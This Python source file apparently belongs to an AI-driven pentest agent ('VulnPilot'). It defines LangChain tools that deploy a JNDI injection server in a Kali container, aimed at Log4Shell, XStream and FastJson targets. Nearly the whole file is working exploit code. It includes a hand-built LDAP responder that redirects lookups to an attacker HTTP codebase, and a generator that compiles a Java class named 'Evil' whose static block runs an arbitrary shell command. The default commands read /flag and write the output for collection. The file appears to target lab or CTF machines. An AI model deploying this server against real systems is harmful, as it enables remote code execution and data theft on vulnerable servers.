"""
OOB (Out-of-Band) 外带攻击基础设施工具
==========================================

用于支持 JNDI 注入类漏洞（如 XStream、Log4Shell、FastJson 等）的完整攻击链。

工具函数：
    - get_attack_ip      获取 Kali 容器对靶机可达的 IP 地址
    - start_jndi_server  在 Kali 容器内启动轻量 LDAP + HTTP 双服务
    - stop_jndi_server   清理监听进程

典型攻击流程（三步走）：
    1. ip = get_attack_ip()
    2. start_jndi_server(attacker_ip=ip, command="cat /flag > /tmp/flag_result")
    3. 构造含 JNDI 地址的 Payload，如 ldap://ip:1389/Evil，发向靶机
    4. 等待靶机回拨，检查 /tmp/jndi_callback.log 确认触发

作者：VulnPilot
"""

import time
from langchain_core.tools import tool

from vulnpilot.common import log_system_event
from vulnpilot.core.singleton import get_config_manager


# ============================================================
# 内嵌 JNDI 服务器 Python 脚本（在 Kali 容器内运行）
# ============================================================
_JNDI_SERVER_SCRIPT = r'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
轻量 JNDI OOB 服务器
将靶机的 JNDI LDAP lookup 重定向到攻击者的 HTTP Class 文件服务器，
触发恶意 Java class 加载并执行指定命令。
"""
import socket, struct, threading, http.server, socketserver
import os, sys, subprocess, time, logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [JNDI-OOB] %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("/tmp/jndi_server_run.log", mode='w')
    ]
)
log = logging.getLogger(__name__)

# -------- 参数解析 --------
ATTACKER_IP  = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
HTTP_PORT    = int(sys.argv[2]) if len(sys.argv) > 2 else 8888
LDAP_PORT    = int(sys.argv[3]) if len(sys.argv) > 3 else 1389
COMMAND      = " ".join(sys.argv[4:]) if len(sys.argv) > 4 else "id > /tmp/jndi_rce_result"

CLASS_DIR    = "/tmp/jndi_class_serve"
PID_FILE     = "/tmp/jndi_server.pid"
CALLBACK_LOG = "/tmp/jndi_callback.log"

os.makedirs(CLASS_DIR, exist_ok=True)

# 写入当前PID以便外部可以 kill
with open(PID_FILE, "w") as f:
    f.write(str(os.getpid()))


# -------- 恶意 Java Class 生成 --------

def _ensure_java():
    """确保 javac 可用"""
    ret = subprocess.call(["which", "javac"],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if ret != 0:
        log.warning("javac 未找到，尝试安装 default-jdk...")
        subprocess.call(
            ["apt-get", "install", "-y", "default-jdk"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )


def generate_malicious_class():
    """生成并编译执行命令的恶意 Java class 文件"""
    _ensure_java()

    # 安全转义命令中的双引号
    safe_cmd = COMMAND.replace('"', '\\"').replace("'", "\\'")

    # Build Java source safely without f-string (avoid brace conflicts)
    java_src = (
        'import java.io.*;\n'
        'public class Evil {\n'
        '    static {\n'
        '        try {\n'
        '            String[] cmd = {"/bin/sh", "-c", "' + safe_cmd + '"};\n'
        '            Process p = Runtime.getRuntime().exec(cmd);\n'
        '            p.waitFor();\n'
        '\n'
        '            String[] log_cmd = {"/bin/sh", "-c",\n'
        '                "echo JNDI_RCE_SUCCESS >> ' + CALLBACK_LOG + '"};\n'
        '            Runtime.getRuntime().exec(log_cmd).waitFor();\n'
        '\n'
        '            // capture cmd output and write to callback log\n'
        '            BufferedReader br = new BufferedReader(\n'
        '                new InputStreamReader(p.getInputStream()));\n'
        '            StringBuilder sb = new StringBuilder();\n'
        '            String line;\n'
        '            while ((line = br.readLine()) != null) sb.append(line).append("\\n");\n'
        '            if (sb.length() > 0) {\n'
        '                FileWriter fw = new FileWriter("' + CALLBACK_LOG + '", true);\n'
        '                fw.write("CMD_OUTPUT: " + sb.toString());\n'
        '                fw.close();\n'
        '            }\n'
        '        } catch (Exception e) {\n'
        '            try {\n'
        '                FileWriter fw = new FileWriter("' + CALLBACK_LOG + '", true);\n'
        '                fw.write("ERROR: " + e.getMessage() + "\\n");\n'
        '                fw.close();\n'
        '            } catch (Exception ignored) {}\n'
        '        }\n'
        '    }\n'
        '}\n'
    )
    src_path   = os.path.join(CLASS_DIR, "Evil.java")
    class_path = os.path.join(CLASS_DIR, "Evil.class")

    with open(src_path, "w") as f:
        f.write(java_src)

    # 尝试用多个 source/target 版本编译（兼容新旧 JDK）
    compiled = False
    for version in ["8", "11", "17"]:
        ret = subprocess.call(
            ["javac", f"-source", version, f"-target", version, src_path],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            cwd=CLASS_DIR
        )
        if ret == 0 and os.path.exists(class_path):
            log.info(f"✅ 恶意 class 编译成功 (Java {version}): {class_path}")
            compiled = True
            break

    if not compiled:
        # 回退：尝试不加 source/target 直接编译
        ret = subprocess.call(
            ["javac", src_path],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            cwd=CLASS_DIR
        )
        if ret == 0 and os.path.exists(class_path):
            log.info(f"✅ 恶意 class 编译成功（默认版本）")
            compiled = True

    return compiled


# -------- BER/LDAP 协议最小实现 --------

def _ber_length(n):
    if n < 0x80:
        return bytes([n])
    elif n < 0x100:
        return bytes([0x81, n])
    else:
        return bytes([0x82, (n >> 8) & 0xFF, n & 0xFF])


def _encode_string(s):
    b = s.encode("utf-8") if isinstance(s, str) else s
    return bytes([0x04]) + _ber_length(len(b)) + b


def _encode_integer(n):
    if n == 0:
        data = bytes([0])
    else:
        data = n.to_bytes((n.bit_length() + 8) // 8, "big")
    return bytes([0x02]) + _ber_length(len(data)) + data


def _encode_enum(n):
    return bytes([0x0A, 0x01, n])


def _encode_seq(content):
    return bytes([0x30]) + _ber_length(len(content)) + content


def _encode_attr(attr_type, attr_value):
    """编码单条 LDAP 属性"""
    t = _encode_string(attr_type)
    v = _encode_string(attr_value)
    val_set = bytes([0x31]) + _ber_length(len(v)) + v
    return _encode_seq(t + val_set)


def _get_msg_id(data):
    """快速提取 LDAP MessageID"""
    try:
        idx = 1
        if data[1] & 0x80:
            idx += (data[1] & 0x7F) + 1
        else:
            idx += 1
        if data[idx] == 0x02:
            ln = data[idx + 1]
            return int.from_bytes(data[idx + 2: idx + 2 + ln], "big")
    except Exception:
        pass
    return 1


def _build_bind_response(msg_id):
    content = _encode_enum(0) + _encode_string("") + _encode_string("")
    app = bytes([0x61]) + _ber_length(len(content)) + content
    return _encode_seq(_encode_integer(msg_id) + app)


def _build_search_entry(msg_id):
    code_base = f"http://{ATTACKER_IP}:{HTTP_PORT}/"
    attrs = (
        _encode_attr("javaClassName",  "Evil")            +
        _encode_attr("javaCodeBase",   code_base)         +
        _encode_attr("objectClass",    "javaNamingReference") +
        _encode_attr("javaFactory",    "Evil")
    )
    attrs_seq = bytes([0x30]) + _ber_length(len(attrs)) + attrs
    obj_name  = _encode_string("")
    entry_content = obj_name + attrs_seq
    app = bytes([0x64]) + _ber_length(len(entry_content)) + entry_content
    return _encode_seq(_encode_integer(msg_id) + app)


def _build_search_done(msg_id):
    content = _encode_enum(0) + _encode_string("") + _encode_string("")
    app = bytes([0x65]) + _ber_length(len(content)) + content
    return _encode_seq(_encode_integer(msg_id) + app)


# -------- 连接处理线程 --------

class _LDAPHandler(threading.Thread):
    def __init__(self, conn, addr):
        super().__init__(daemon=True)
        self.conn  = conn
        self.addr  = addr

    def run(self):
        log.info(f"📡 LDAP 连接来自: {self.addr}")
        try:
            while True:
                data = self.conn.recv(4096)
                if not data:
                    break

                msg_id = _get_msg_id(data)

                # 识别操作类型（简单取 tag 字节）
                try:
                    idx = 1 + (1 if not (data[1] & 0x80) else (data[1] & 0x7F) + 1)
                    if data[idx] == 0x02:
                        ln = data[idx + 1]
                        idx = idx + 2 + ln
                    op_tag = data[idx]
                except Exception:
                    op_tag = 0

                if op_tag == 0x60:      # BindRequest
                    log.info("收到 BindRequest → 返回 BindResponse")
                    self.conn.send(_build_bind_response(msg_id))

                elif op_tag == 0x63:    # SearchRequest  ← 这是关键
                    log.info(f"🎯 收到 JNDI SearchRequest！发送恶意 Class 重定向")
                    with open(CALLBACK_LOG, "a") as f:
                        import datetime
                        f.write(f"{datetime.datetime.now()} LDAP_SEARCH from {self.addr}\n")
                    self.conn.send(_build_search_entry(msg_id))
                    self.conn.send(_build_search_done(msg_id))
                    log.info("✅ JNDI 重定向响应已发送")

        except Exception as e:
            log.debug(f"连接异常（通常是正常断开）: {e}")
        finally:
            self.conn.close()


# -------- 服务主函数 --------

def start_http_server():
    os.chdir(CLASS_DIR)
    class _SilentHandler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, fmt, *args):
            log.info(f"HTTP 请求: {self.address_string()} — {fmt % args}")
    with socketserver.TCPServer(("0.0.0.0", HTTP_PORT), _SilentHandler) as httpd:
        log.info(f"✅ HTTP Class 服务: 0.0.0.0:{HTTP_PORT}")
        httpd.serve_forever()


def start_ldap_server():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", LDAP_PORT))
    srv.listen(10)
    log.info(f"✅ LDAP 监听: 0.0.0.0:{LDAP_PORT}")
    while True:
        conn, addr = srv.accept()
        _LDAPHandler(conn, addr).start()


if __name__ == "__main__":
    log.info("=" * 50)
    log.info("🚀 JNDI OOB 服务器启动")
    log.info(f"   攻击者 IP : {ATTACKER_IP}")
    log.info(f"   LDAP 端口 : {LDAP_PORT}")
    log.info(f"   HTTP 端口 : {HTTP_PORT}")
    log.info(f"   注入命令  : {COMMAND}")
    log.info("=" * 50)

    if not generate_malicious_class():
        log.error("⚠️  恶意 class 未能编译，服务仍将运行（可能需要手动提供 class 文件）")

    http_thread = threading.Thread(target=start_http_server, daemon=True)
    http_thread.start()

    try:
        start_ldap_server()
    except KeyboardInterrupt:
        log.info("服务器已终止")
'''


# ============================================================
# LangChain 工具定义
# ============================================================

@tool
def get_attack_ip() -> str:
    """
    获取 Kali 容器在 Docker 内网中对靶机可达的 IP 地址。

    这是 JNDI 注入攻击的前置步骤。获取到的 IP 将作为 JNDI LDAP URL 中
    的攻击者地址，例如 ldap://<attack_ip>:1389/Evil。

    Returns:
        攻击机（Kali 容器）的内网 IP 地址字符串。
    """
    executor = get_config_manager().executor

    # 获取容器第一个内网 IP
    result = executor.execute(
        "hostname -I | awk '{print $1}' | tr -d '\\n'",
        timeout=10
    )

    ip = result.stdout.strip() if result.stdout else ""
    if ip:
        log_system_event(f"[OOB] 攻击机 IP: {ip}")
        return (
            f"攻击机（Kali 容器）IP 地址：{ip}\n\n"
            f"请使用此 IP 构造 JNDI LDAP URL：\n"
            f"  ldap://{ip}:1389/Evil\n\n"
            f"⚠️ 调用 start_jndi_server 时，请将 attacker_ip 参数设置为 {ip}"
        )
    else:
        return "⚠️ 无法获取攻击机 IP，请检查 Docker 容器网络配置。"


@tool
def start_jndi_server(
    attacker_ip: str,
    command: str = "id > /tmp/jndi_rce_result && cat /flag >> /tmp/jndi_rce_result 2>/dev/null",
    ldap_port: int = 1389,
    http_port: int = 8888,
) -> str:
    """
    在 Kali 容器内启动轻量 JNDI OOB 服务器（LDAP + HTTP 双服务）。

    用于 XStream、Log4Shell、FastJson 等 JNDI 注入类型漏洞的利用前置准备。
    服务器将：
    1. 在 ldap_port 上监听 JNDI LDAP lookup 请求
    2. 在 http_port 上提供恶意 Java class 文件下载服务
    3. 靶机触发 JNDI lookup 后，自动加载并执行 command 参数指定的命令

    启动后，可在靶机 Payload 中使用：
        ldap://<attacker_ip>:<ldap_port>/Evil

    检查是否触发：
        cat /tmp/jndi_callback.log

    Args:
        attacker_ip: 攻击机 IP（靶机可达，通过 get_attack_ip 获取）
        command:     靶机执行的 Shell 命令，默认执行 id 并尝试读取 /flag
        ldap_port:   LDAP 监听端口（默认 1389）
        http_port:   HTTP Class 文件服务端口（默认 8888）

    Returns:
        启动状态信息和 JNDI URL 供后续 Payload 构造使用。
    """
    executor = get_config_manager().executor

    # 安全清理旧进程和文件
    executor.execute("pkill -f 'jndi_server.py' 2>/dev/null; "
                     "rm -f /tmp/jndi_server.pid /tmp/jndi_callback.log", timeout=5)
    time.sleep(1)

    # 将内嵌脚本写入 Kali 容器
    # 对单引号进行转义，使用 heredoc 方式写文件
    script_content = _JNDI_SERVER_SCRIPT.replace("'", "'\"'\"'")
    write_cmd = f"cat > /tmp/jndi_server.py << 'HEREDOC_EOF'\n{_JNDI_SERVER_SCRIPT}\nHEREDOC_EOF"
    result = executor.execute(write_cmd, timeout=15)
    if result.exit_code != 0:
        return f"❌ 写入 JNDI 服务器脚本失败：{result.stderr[:500]}"

    log_system_event("[OOB] JNDI 服务器脚本已写入 Kali 容器")

    # 后台启动服务
    start_cmd = (
        f"nohup python3 /tmp/jndi_server.py "
        f"{attacker_ip} {http_port} {ldap_port} "
        f"'{command}' "
        f"> /tmp/jndi_server_stdout.log 2>&1 &"
    )
    executor.execute(start_cmd, timeout=10)

    # 等待启动
    time.sleep(4)

    # 验证端口是否在监听
    check_result = executor.execute(
        f"ss -tlnp | grep -E '{ldap_port}|{http_port}'", timeout=10
    )
    ports_up = check_result.stdout.strip()

    log_system_event("[OOB] JNDI 服务器启动状态检查", {
        "ports_listening": ports_up,
        "attacker_ip": attacker_ip,
        "command": command
    })

    jndi_url = f"ldap://{attacker_ip}:{ldap_port}/Evil"

    if ports_up:
        status = "✅ JNDI OOB 服务器已成功启动！"
    else:
        status = "⚠️ 端口未检测到监听，可能仍在初始化（尤其是 javac 编译需要时间），请稍等10秒后继续"

    return (
        f"{status}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📡 JNDI LDAP 地址（Payload 使用）：\n"
        f"   {jndi_url}\n\n"
        f"🌐 HTTP Class 文件服务：\n"
        f"   http://{attacker_ip}:{http_port}/Evil.class\n\n"
        f"💻 注入命令：\n"
        f"   {command}\n\n"
        f"📋 验证是否触发（等靶机回拨后执行）：\n"
        f"   cat /tmp/jndi_callback.log\n"
        f"   cat /tmp/jndi_rce_result\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚡ 下一步：构造含 JNDI URL 的漏洞 Payload 发向靶机！\n"
        f"   例如，对于 XStream 漏洞，在 XML payload 中嵌入：\n"
        f"   {jndi_url}"
    )


@tool
def check_jndi_callback() -> str:
    """
    检查 JNDI OOB 服务器是否已收到靶机的回调请求，并返回命令执行结果。

    在发送含 JNDI URL 的 Payload 后调用此工具，验证漏洞是否被成功触发。

    Returns:
        回调记录内容和命令执行结果。
    """
    executor = get_config_manager().executor

    result = executor.execute(
        "echo '=== 回调记录 ===' && "
        "cat /tmp/jndi_callback.log 2>/dev/null || echo '(暂无回调记录)' && "
        "echo '=== 命令执行结果 ===' && "
        "cat /tmp/jndi_rce_result 2>/dev/null || echo '(暂无结果文件)' && "
        "echo '=== 服务器运行日志（最后20行）===' && "
        "tail -20 /tmp/jndi_server_run.log 2>/dev/null || echo '(无服务器日志)'",
        timeout=10
    )

    output = result.stdout.strip()
    log_system_event("[OOB] 检查 JNDI 回调结果", {"output_preview": output[:200]})

    # 判断是否成功
    if "JNDI_RCE_SUCCESS" in output or "LDAP_SEARCH" in output:
        success_hint = "\n🎉 检测到 JNDI 回调！漏洞利用成功！请查看上方的命令执行结果。\n"
    else:
        success_hint = "\n⏳ 尚未检测到回调，请确认：\n  1. 靶机已收到含 JNDI URL 的 Payload\n  2. 服务器 IP 和端口靶机可达\n  3. 等待5-10秒后再次检查\n"

    return output + success_hint


@tool
def stop_jndi_server() -> str:
    """
    停止 Kali 容器内正在运行的 JNDI OOB 服务器，释放端口。

    在完成漏洞利用后调用，防止端口占用影响后续测试。

    Returns:
        停止结果信息。
    """
    executor = get_config_manager().executor

    result = executor.execute(
        "pkill -f 'jndi_server.py' 2>/dev/null && echo '✅ JNDI 服务器已停止' "
        "|| echo '⚠️ 未找到运行中的 JNDI 服务器'",
        timeout=10
    )

    log_system_event("[OOB] 停止 JNDI 服务器", {"result": result.stdout.strip()})
    return result.stdout.strip()
